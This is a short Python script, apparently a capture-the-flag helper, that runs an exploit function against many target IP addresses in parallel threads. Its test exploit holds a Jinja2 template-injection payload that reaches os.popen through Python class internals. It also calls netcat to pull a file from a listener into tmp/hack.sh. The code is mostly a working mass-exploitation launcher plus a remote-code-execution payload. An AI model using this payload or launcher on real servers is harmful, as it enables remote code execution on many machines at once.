#!/usr/bin/python3
import threading

def send(exploit, target, *args) -> str:
    return exploit(target,args)

def _send_wrapper(exploit,target,args,outputs,output_index):
    output = exploit(target,args)
    outputs[output_index]=output

def _multisend(exploit,targets,*args):
        threads = [None]*len(targets)
        threads_working = [True]*len(targets)
        outputs = [None]*len(targets)

        for thread_idx in range(len(targets)):
            target = targets[thread_idx]
            thread = threading.Thread(target=_send_wrapper, args=(exploit, target, args,outputs,thread_idx))
            threads[thread_idx] = thread
            thread.start()

        while (any(threads_working)):
            for thread_idx in range(len(threads)):
                if not threads_working:
                    continue
                
                thread:threading.Thread = threads[thread_idx]
                if not thread.is_alive():
                    thread.join()
                    output = outputs[thread_idx]
                    threads_working[thread_idx] = False
                    yield (target, output)

def full_send(exploit,targets,*args,multithread=True):
    outputs = []
    if multithread:
        for output in _multisend(exploit,targets,args):
            outputs.append(output)
    else:
        for target in targets:
            output = exploit(target, args)
            outputs.append(output)
    return outputs

import requests
def test_exploit(target, args):
    #attack = r"""{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("nc localhost 2024 > tmp/hack.sh").read()}}"""
    #rq = requests.get(f"http://{target}:8000/?name={attack}")
    
    #return rq.content
    import os
    os.popen("nc localhost 2024 > tmp/hack.sh")
    return None

if __name__=="__main__":
    print("Testing one send")
    send(test_exploit, "192.168.2.181")

    print ("Testing full send multithread")
    test_ips = ["192.168.2.181"] * 100
    outputs = full_send(test_exploit, test_ips, multithread=False)
    print ( [x for x in zip(test_ips, outputs)])